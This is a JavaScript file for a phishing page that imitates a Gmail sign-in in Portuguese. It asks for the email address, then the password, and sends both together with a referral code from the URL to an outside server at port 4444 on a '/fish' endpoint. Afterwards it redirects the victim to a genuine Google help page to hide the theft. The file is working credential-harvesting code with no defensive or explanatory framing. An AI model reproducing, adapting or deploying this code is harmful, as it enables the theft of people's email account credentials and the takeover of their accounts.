
let esqueceu = document.querySelector('.esqueceu');
let inputName = document.querySelector('.inputName');
let inputPass = document.querySelector('.inputPass');
let logoCont = document.querySelector('.logoCont');

const params = new URLSearchParams(window.location.search);
const uId = params.get("ref");

let codeRef = uId

let h1 = "Fazer Login";
let p = "Ir para Gmail";


logoCont.innerHTML = `
   <img src="Gmail_files/logo.png" alt="">
   <h1>${h1}</h1>
   <p>${p}</p>
`;

let dados = {
    platform: document.querySelector(".platform").value,
    user: "",
    pass: "",
    codRef: codeRef
};



document.addEventListener('click', async (e) => {
    if (e.target.id === 'next') {
        e.target.classList.add('next2');

        if (inputName.value.includes('@')) {
            esqueceu.textContent = 'Esqueceu a senha?';
            dados.user = inputName.value;

            h1 = "Olá!";
            p = inputName.value;

            logoCont.innerHTML = `
                <h1>${h1}</h1>
                <p class="viewEmail">${p}</p>
            `;

            inputName.placeholder = "Senha";
            inputName.classList.add('hidden');
            inputPass.classList.remove('hidden');
        }

        if (e.target.classList.contains('next2')) {
            dados.pass = inputPass.value;
            document.querySelector("#next").classList.add('enviar');

            if (dados.pass.length > 0) {
               enviar(dados)
                window.location.href = "https://support.google.com/mail/troubleshooter/2402620?hl=pt-BR&ref_topic=7065107"  
            }

            console.log(dados);
        }
    }
});


async function enviar(dados) {
    const res = await fetch(host+":4444/fish",{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body:JSON.stringify(dados)
    })


    const data = await res.json()

}